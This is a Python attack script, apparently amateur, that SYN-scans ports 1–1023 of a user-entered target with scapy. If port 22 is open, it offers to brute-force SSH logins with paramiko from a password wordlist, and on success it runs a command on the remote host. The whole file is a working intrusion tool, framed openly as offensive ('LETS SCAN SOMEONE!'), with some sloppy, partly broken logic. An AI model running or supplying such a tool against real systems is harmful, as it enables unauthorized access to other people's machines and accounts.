    ########  #######  ##  ###   ##  ##########  #######  #######  ##     ##
   ##    ##  ##       ##  ####  ##      ##           ##  ##       ##     ##
  ##    ##  #######  ##  ## ## ##      ##        #####  ##       #########
 ##    ##       ##  ##  ##  ####      ##           ##  ##       ##     ##
########  #######  ##  ##   ###      ##      #######  #######  ##     ##


##################
# IMPORTS
##################
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1, sr
import paramiko

##################
# VARIABLE
##################


print("LETS SCAN SOMEONE!")
target = input("Enter target You wanna to scan: ")

registered_ports = range(1, 1024)

conf.verb = 0

open_ports = []

send_icmp = sr1(IP(dst=target) / ICMP(), timeout=3)


##################
# FUNCTIONS
##################
# for this scan make sure that u have administrator permission.
def scanport(port):
    source_port = RandShort()

    sync_packet = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)

    rst_packet = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=0.5)

    if sync_packet is None:
        print("Synchnronization Packet doesnt exist.")
        return False

    if not sync_packet.haslayer(TCP):
        print("TCP doesnt exist")
        return False

    if sync_packet[TCP].flags == 0x12:
        print("Port {} is open!".format(port))
        open_ports.append(port)


    else:
        print("Port {} is closed".format(port))
        return False


def check_target_availability(target):
    echo_request = IP(dst=target) / ICMP()
    echo_response = sr1(echo_request, timeout=2)

    if echo_response:

        return True
    else:

        return False


def function(scanport):
    try:
        conf.verb = 0
        if check_target_availability(target) == True:
            print("Connection exists!!")
            scanport(port)
    except Exception as error:
        if check_target_availability(target) == False:
            print(error)
    return False


def check_ICMP(send_icmp):
    try:
        if send_icmp:
            print("ICMP returned successfully")
            return True

    except Exception:
        print("ICMP didnt returnet successfully")
        return False


def load_passwords_from_file():

    with open("PasswordList.txt", "r") as password_file: #there you should type Your wordlist.
        passwords = password_file.readlines()
    return [password.strip() for password in passwords]

def BruteForce(port):
    passwords = load_passwords_from_file()
    username = (input("Enter username for SSH bruteforce Attack:"))
    load_passwords_from_file()
    for password in passwords:
        try:
            sshconn = paramiko.SSHClient()
            sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshconn.load_system_host_keys()
            sshconn.connect(hostname=target, port=port, username=username, password=password, timeout=1)
            stdin, stdout, stderr = sshconn.exec_command('ls -al')
            print(stdout.read().decode("utf-8"))
            time.sleep(2)
            print("[+]Login succesfull with {} : {}".format(username, password))
            
            break
        except paramiko.ssh_exception.AuthenticationException as error:
            print("Wrong login credentials: {} : {} ".format(username, password) + str(error))
        except Exception as error:
            print("Something went wrong: " + str(error))




for port in registered_ports:
    status = scanport(port)

    if status:
        open_ports.append(port)
print("Open ports: {}".format(open_ports))
print("Scan Finished!")

if 22 in open_ports:

    answer = input("Do You wanna BruteForce ssh on 22 port? Y/N: ")
    if answer in ['Y', 'y']:
        port=22
        BruteForce(port)
    elif answer in ['N', 'n']:
        print("Ok, Goodbye! :)")
